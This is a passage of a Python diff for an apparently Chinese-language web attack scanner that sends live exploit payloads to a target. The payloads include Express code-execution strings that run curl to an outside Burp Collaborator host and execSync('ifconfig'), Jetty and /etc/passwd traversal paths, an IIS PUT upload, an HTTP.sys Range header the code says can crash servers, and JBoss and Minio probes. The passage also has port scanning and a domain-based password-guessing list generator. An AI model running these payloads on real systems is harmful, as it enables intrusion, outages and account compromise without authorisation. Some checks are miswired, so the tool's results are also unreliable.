+            response = requests.get(url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if 'root' in response.text:
+                with open('./result/express.txt', 'a') as w:
+                    w.write(url + "\n")
+        except Exception as e:
+            pass
+
+    def _express_work(self, url, thread):
+        print(f"[{current_time}][-] 开始检测Express漏洞......")
+        exp_url = [
+            f"{url}/?test=Function(require('child_process').exec('curl+547q0etugr2fu1ehjlkto83s1j79vy.burpcollaborator.net'))()",
+            f"{url}/?test=Reflect.construct(Function,[res.send(require('child_process').execSync('ifconfig'))])()",
+        ]
+        time.sleep(1)
+        with tqdm(total=len(exp_url), desc='Express检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread) as pool:
+                try:
+                    futures = [pool.submit(self._express, res_url) for res_url in exp_url]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Express")
+
+    def _jetty(self, url):
+        try:
+            response = requests.get(url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and 'web-app' in response.text:
+                with open('./result/jetty.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _jetty_work(self, url, thread):
+        print(f"[{current_time}][-] 开始检测Jetty历史漏洞......")
+        poc_list = [
+            f"{url}/static?/%2557EB-INF/web.xml",
+            f"{url}/%2e/WEB-INF/web.xml",
+            f"{url}/%u002e/WEB-INF/web.xml",
+            f"{url}/.%00/WEB-INF/web.xml",
+        ]
+        time.sleep(1)
+        with tqdm(total=len(poc_list), desc='Jetty检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread) as pool:
+                try:
+                    futures = [pool.submit(self._express, res_url) for res_url in poc_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Jetty")
+    def _iis(self,url):
+        res_url = f"{url}/qqq.txt"
+        data = 'hello,iis'
+        try:
+            resp = requests.put(res_url, data=data, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response = requests.get(res_url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if 'hello,iis' in response.text:
+                with open('./result/iis.txt','a') as w:
+                    w.write('存在iis-put上传,参考https://mp.weixin.qq.com/s/2pJGyIOKEFvI-LqdHMLudQ,漏洞地址:' + res_url + '\n')
+        except Exception as e:
+            pass
+    def _iis_http_sys(self,url):
+        headers = {
+            'Range': 'bytes=0-18446744073709551615',
+                   }
+        try:
+            response = requests.get(url, headers=headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            if response.status_code == 416 and 'Range Not Satisfiable' in response.text:
+                with open('./result/iis.txt','a') as w:
+                    w.write('存在iis-hhtp-sys远程代码执行，可造成服务器蓝屏死机:' + url + '网站请求头改为:Range: bytes=0-18446744073709551615\n')
+        except Exception as e:
+            pass
+    def _iis_dir(self,url):
+        url_one = f"{url}/*~1****/a.aspx"
+        url_two = f"{url}/1234*~1****/a.aspx"
+        try:
+            response_one = requests.get(url_one, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response_two = requests.get(url_two, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            if response_one.status_code == 404 and response_two.status_code == 400:
+                with open('./result/iis.txt', 'a') as w:
+                    w.write(f'存在iis漏洞,url:{url},构造参数url:{url_one} 和:{url_two},详情:https://mp.weixin.qq.com/s/2pJGyIOKEFvI-LqdHMLudQ\n')
+        except Exception as e:
+            pass
+
+    def _iis_work(self,url,thread):
+        print(f"[{current_time}][-] 开始检测IIS漏洞......")
+        poc_list = [
+            self._iis,
+            self._iis_http_sys,
+            self._iis_dir
+        ]
+        time.sleep(1)
+        with tqdm(total=len(poc_list), desc='IIS检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread) as pool:
+                try:
+                    futures = [pool.submit(job,url) for job in poc_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures,"IIS")
+    def _jboss_rce(self,url):
+        try:
+            res_url = f"{url}/invoker/readonly"
+            response = requests.get(url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            if response.status_code == 500:
+                with open('./result/jboss.txt','a') as w:
+                    w.write('存在jboss-CVE-2017-12149-rce,工具https://github.com/yunxu1/jboss-_CVE-2017-12149，网站位置:'+ res_url + '\n')
+        except Exception as e:
+            pass
+    def _jboss_rce2(self,url):
+        try:
+            res_url = f"{url}/jbossmq-httpil/HTTPServerILServlet"
+            response = requests.get(url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if 'This is the JBossMQ HTTP-IL' in response.text:
+                with open('./result/jboss.txt','a') as w:
+                    w.write('存在jboss-CVE-2017-7504,工具https://github.com/joaomatosf/JavaDeserH2HC，网站位置:'+ res_url + '\n')
+        except Exception as e:
+            pass
+    def _jboss_rce_work(self,url,thread):
+        print(f"[{current_time}][-] 开始检测Jboss-Rce......")
+        poc_list = [
+            self._jboss_rce,
+            self._jboss_rce2
+        ]
+
+        with tqdm(total=len(poc_list), desc='Jboss检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread) as pool:
+                try:
+                    futures = [pool.submit(jobs,url) for jobs in poc_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures,"Jboss-Rce")
+    def _minio(self,url):
+        hostname = url.split('/')[2]
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
+            "host": hostname,
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        data = ""
+        try:
+            response = requests.post(url,headers=headers, data=data, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if 'Minio' in response.text:
+                with open('./result/minio.txt','a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+    def _minio_work(self,url,thread):
+        print(f"[{current_time}][-] 开始检测Minio漏洞......")
+        port_list = [9000,9001,7000,7001,9800,9889,9029]
+        url_list = []
+        for port in port_list:
+            poc_url = f"{url}:{port}/minio/bootstrap/v1/verify"
+            url_list.append(poc_url)
+        time.sleep(1)
+        with tqdm(total=len(url_list), desc='Mnino检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread) as pool:
+                try:
+                    futures = [pool.submit(self._minio,res_url) for res_url in url_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures,"Mnino漏洞")
+
+        print(f"[{current_time}][-] Minio漏洞检测结束")
+    def main(self, demo_url, threads):
+        print(f"[{current_time}][-] 开始整理URL链接......")
+        time.sleep(1)
+        link_list = []
+        with open('result/link.txt', 'r') as links:
+            links_lines = links.readlines()
+            for link in links_lines:
+                link = link.strip()
+                if link:
+                    if link.split('/')[2].strip() == demo_url.split('/')[2].strip():
+                        if 'root' in link or 'admin' in link:
+                            print(f"[{current_time}][*] 找到admin: {link.strip()}")
+                        elif "=" in link:
+                            link_list.append(link.strip())
+        print(f"[{current_time}][-] URL链接整理结束")
+        # xss/sql
+        if link_list:
+            time.sleep(2)
+            self._xss_work(link_list, threads)
+            # sql 检测
+            time.sleep(2)
+            self._sql_work(link_list, links_lines, threads)
+            # 命令执行
+            time.sleep(2)
+            self._cmd_work(link_list, threads)
+            # 模版注入
+            time.sleep(2)
+            self._ssit_work(link_list, threads)
+
+        # tp
+        time.sleep(2)
+        self._ssrf(demo_url)
+        time.sleep(2)
+        self._thinkphp_work(demo_url, threads)
+        # 目录穿越
+        time.sleep(2)
+        dir_url = demo_url + "/../../../../../../../../etc/passwd"
+        self._dir(dir_url)
+        # pma
+        time.sleep(2)
+        pma_url = demo_url + ':888/pma'
+        self._pma(pma_url)
+        # wp
+        time.sleep(2)
+        self._wordpress_work(demo_url, threads)
+        time.sleep(2)
+        self._wp_sql(demo_url)
+        time.sleep(2)
+        self._wp_feed_work(demo_url, threads)
+        time.sleep(2)
+        # 未授权
+        # self._unauthorized_work(threads)
+        # time.sleep(2)
+        # apache
+        self._apache_http_work(demo_url, threads)
+        time.sleep(2)
+        # php-union
+        self._php_work(demo_url, threads)
+        time.sleep(2)
+        # xxe
+        self._xxe(demo_url)
+        time.sleep(2)
+        # struts
+        self._struts_work(demo_url, threads)
+        time.sleep(2)
+        # spring目录
+        self._spring_work(demo_url, threads)
+        time.sleep(2)
+        # spring-rce
+        self._spring_rce(demo_url)
+        time.sleep(2)
+        # swagger
+        self._swagger_work(threads)
+        time.sleep(2)
+        # jsonp目录及检测
+        self._json_url_check_work(threads)
+        time.sleep(2)
+        self._jsonp_work(demo_url, threads)
+        time.sleep(2)
+        # cors
+        self._cors(demo_url)
+        time.sleep(2)
+        # shiro
+        self._shiro(demo_url)
+        time.sleep(2)
+        # node_js
+        self._node_js(demo_url)
+        time.sleep(2)
+        # apisix
+        self._apisix(demo_url)
+        time.sleep(2)
+        # django
+        self._django(demo_url)
+        time.sleep(2)
+        # juqery
+        self._juqery(demo_url)
+        time.sleep(2)
+        # 帆软
+        self._fanruan_work(demo_url, threads)
+        time.sleep(2)
+        # Jboss未授权
+        self._jboss_work(demo_url, threads)
+        time.sleep(2)
+        self._jboss_rce_work(demo_url,threads)
+        time.sleep(2)
+        self._zabbix_work(demo_url, threads)
+        time.sleep(2)
+        self._joomla(demo_url)
+        time.sleep(2)
+        self._xssi(demo_url)
+        time.sleep(2)
+        self._weblogic_work(demo_url, threads)
+        time.sleep(2)
+        self._express_work(demo_url, threads)
+        time.sleep(2)
+        self._jetty_work(demo_url, threads)
+        time.sleep(2)
+        self._tomcat_work(demo_url, threads)
+        time.sleep(2)
+        self._iis_work(demo_url,threads)
+        time.sleep(2)
+        self._minio_work(demo_url,threads)
+        time.sleep(2)
+        print(f"[{current_time}][-] 任务全部执行完成")
+        print(f"[{current_time}][-] 输出结果保留result文件夹:)")
+
+
+# web信息类
+class Info(object):
+    def __init__(self, url, threads):
+        self._ua = UserAgent()
+        if gl_headers:
+            self._header = {"User-Agent": gl_headers}
+        else:
+            self._header = {"User-Agent": self._ua.random}
+        self._url = url
+        self._threads = int(threads)
+        self._ports = []
+        self._cms_patterns = cms_patterns
+
+    # web服务信息
+    def _init(self):
+        try:
+            res = requests.get(url=self._url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            res_head = res.headers
+            try:
+                if 'PHPSESSID' in res_head['Set-Cookie']:
+                    print(f"[{current_time}][*] 编程语言为：php")
+            except Exception as e:
+                pass
+            try:
+                print(f"[{current_time}][*] 中间件:{res.headers['Server']}")
+            except Exception as e:
+                print(f"[{current_time}][-] 未找到中间件信息")
+            try:
+                print(f"[{current_time}][*] 脚本语言:{res.headers['X-Powered-By']}")
+            except Exception as e:
+                print(f"[{current_time}][-] 未找到脚本语言信息")
+            try:
+                if '(' in res_head['Server']:
+                    res_ser = res_head['Server'].split('(')
+                    print(f"[{current_time}][*] 操作系统:{res_ser[-1].strip('()')}")
+                elif 'IIS' in res_head['Server']:
+                    print(f"[{current_time}][*] 操作系统:windows")
+                else:
+                    print(f"[{current_time}][-] 未找到系统信息")
+
+            except Exception as e:
+                print(f"[{current_time}][-] 未找到系统信息")
+            try:
+                print(f"[{current_time}][*] CMS信息:{res.headers['X-Powered-CMS']}")
+            except Exception as e:
+                print(f"[{current_time}][-] 未在服务信息找到CMS信息")
+            if 'cloudflare' in res.text:
+                print(f'[{current_time}][*] 网站配置：cloudflare')
+            try:
+                print(f"[{current_time}][*] X-XSS-Protection配置:{res_head['X-XSS-Protection']}")
+            except Exception as e:
+                print(f'[{current_time}][-] 未检测到X-XSS-Protection')
+        except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ReadTimeout, requests.exceptions.InvalidHeader) as e:
+            print(f"[{current_time}][-] error:代理无法访问:(\n[!]{e}")
+            sys.exit()
+
+    def _cms(self):
+        print(f"[{current_time}][*] 开始检测CMS信息......")
+        # 去重
+        cms_patterns = list(set(self._cms_patterns))
+        # 发送 HTTP GET 请求
+        response = requests.get(url=self._url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=5, proxies=gl_proxy)
+        # 获取响应内容
+        content = response.content.decode('utf-8')
+        # 遍历所有 CMS 特征，检查其是否出现在响应内容中
+        for cms, pattern in cms_patterns:
+            if pattern in content:
+                print(f"[{current_time}][*] URL使用CMS: {cms}")
+                # break  # 只输出第一个匹配的 CMS
+        else:
+            print(f"[{current_time}][*] URL未检测出已知CMS")
+
+    # 真实IP验证
+    # def _ip_adr(self, ip_list):
+    #     ips = []
+    #     nm = nmap.PortScanner()
+    #     try:
+    #         for ip in ip_list:
+    #             result = nm.scan(hosts=ip, arguments='-sn')
+    #             # 获取扫描结果
+    #             for host in nm.all_hosts():
+    #                 if nm[host]['status']['state'] == 'up':
+    #                     print(f"[{current_time}][*] 找到真实IP地址: {ip}")
+    #                     ips.append(ip)
+    #     except Exception as e:
+    #         pass
+    #     return ips
+    # 查找ip
+    def _ip_find(self):
+        ip_list = []
+        try:
+            ip_list = socket.gethostbyname_ex(self._url.split('//')[-1])[2]
+        except Exception as e:
+            pass
+        if ip_list:
+            for ip_adr in ip_list:
+                print(f"[{current_time}][*] 找到IP地址: {ip_adr}")
+        print(f"[{current_time}][*INFO*] 因API问题暂时未能验证真实IP，注:104/108/172均为CDN")
+        return ip_list
+
+    # web端口信息
+    def _ip_port(self, ip, port):
+        result = []
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # 超时
+        s.settimeout(0.5)
+        # 发起请求
+        try:
+            if s.connect_ex((ip, port)) == 0:
+                result.append(port)
+                # 关闭连接
+                s.close()
+        except Exception as e:
+            pass
+        return result
+
+    # 子域名接管
+    def _check_subdomain_takeover(self):
+        print(f'[{current_time}][-] 检测是否存在子域名接管......')
+        subdomain = self._url.split('/')[2]
+        try:
+            # 解析子域名的CNAME记录
+            answers = dns.resolver.resolve(subdomain, "CNAME")
+            cname_record = answers[0].to_text().strip(".")
+            print(f"[{current_time}][*] {subdomain} 的 CNAME 记录指向: {cname_record}")
+
+            try:
+                # 解析规范名称的IP地址
+                ip = dns.resolver.resolve(cname_record, "A")
+                print(f"[{current_time}][*] {cname_record} 解析为 IP 地址: {ip[0].to_text()}")
+            except dns.resolver.NXDOMAIN:
+                print(f"[{current_time}][*] 警告: {cname_record} 无法解析为 IP 地址。可能存在子域名接管风险。")
+        except dns.resolver.NoAnswer:
+            print(f"[{current_time}][*] {subdomain} 没有找到 CNAME 记录")
+        except dns.resolver.NXDOMAIN:
+            print(f"[{current_time}][-] 子域名 {subdomain} 不存在。")
+        except Exception as e:
+            print(f"[{current_time}][-] error: {e}")
+
+    # 社工密码
+    def _split_and_recombine(self, domain, min_length=6, max_length=10):
+        domain_parts = [domain[i: j] for i in range(len(domain)) for j in range(i + 1, len(domain) + 1) if '.' not in domain[i:j]]
+        random.shuffle(domain_parts)
+
+        password = ''
+        while len(password) < min_length:
+            password += random.choice(domain_parts)
+            if len(password) > max_length:
+                password = password[:max_length]
+                break
+
+        # 添加随机大写字母和特殊字符
+        # uppercase_letter = random.choice(string.ascii_uppercase)
+        # special_char = random.choice(string.punctuation.replace('.', ''))
+        uppercase_letter = random.choice(string.ascii_uppercase)
+        special_char = random.choice(['_', '*', '@'])
+
+        insert_pos_upper = random.randint(0, len(password))
+        password = password[:insert_pos_upper] + uppercase_letter + password[insert_pos_upper:]
+
+        insert_pos_special = random.randint(0, len(password))
+        password = password[:insert_pos_special] + special_char + password[insert_pos_special:]
+
+        return password
+
+    def _passwd(self, domain, min_length=6, max_length=10, num_results=50000):
+        passwords = set()
+        progress_bar = tqdm(total=num_results, desc="随机字典生成进度", bar_format="{l_bar}{bar:30}{r_bar}", colour='black')
+
+        while len(passwords) < num_results:
+            # 随机拆分重组域名
+            password = self._split_and_recombine(domain, min_length, max_length)
+            if len(password) <= max_length and password not in passwords:
+                passwords.add(password)
+                progress_bar.update(1)
+
+        progress_bar.close()
+        return list(passwords)[:num_results]
+
+    def _save_passwords_to_file(self, passwords, filename):
+        with open(filename, "w") as f:
+            for password in passwords:
+                f.write(password + '\n')
+
+    def _passwd_work(self):
+        print(f'[{current_time}][-] 开始根据域名生成随机密码......')
+        domain = self._url.split('/')[2].split('.')[0] + self._url.split('/')[2].split('.')[1]
+        passwords = self._passwd(domain)
+        self._save_passwords_to_file(passwords, "./result/domain_pwds.txt")
+        print(f"[{current_time}][*] 已将 {len(passwords)} 个密码保存到./result/domain_pwds.txt 文件中。")
+
+    # 运行入口
+    def main(self):
+        time.sleep(1)
+        self._init()
+        self._cms()
+        self._check_subdomain_takeover()
+        ips = self._ip_find()
+        self._passwd_work()
+        res = []
+        if ips:
+            tasks = len(ips) * 10
+            print(f"[{current_time}][-] 等待扫描端口......")
+            with tqdm(total=tasks, desc="端口检测进度", bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+                with ThreadPoolExecutor(int(self._threads)) as pool:
+                    try:
+                        future_tasks = [pool.submit(self._ip_port, ip, port) for ip in ips for port in range(1, 11)]
+                    except Exception as e:
+                        pass
+                    for future in concurrent.futures.as_completed(future_tasks):
+                        res.append(future.result())
+                        pbar.update(1)
+                wait(future_tasks)
+            time.sleep(1)
+            print(f"[{current_time}][-] 端口信息扫描结束")
+            if res:
+                print(f"[{current_time}][*INFO*] 端口信息通过调用socket与nmap均存在代理干扰......")
+                print(f"[{current_time}][*INFO*] 故端口信息存在一定技术难度，结果暂不输出......")
+                print(f"[{current_time}][*INFO*] 若不在意代理可全文搜索for host in res开放注释代码，关闭代理!!!")
+                # for host in res:
+                #     print(f"[{current_time}][*] port {host} is open")
+        else:
+            print(f"[{current_time}][-] IP检测结束")
+            print(f'[{current_time}][-] 没有找到真实IP')
+
+
+# 入口
+if __name__ == '__main__':
+    now = datetime.datetime.now()
+    current_time = now.strftime("%H:%M:%S")
+    try:
+        PocMan().main()
+    except KeyboardInterrupt as e:
+        print(f"[{current_time}] {e}")
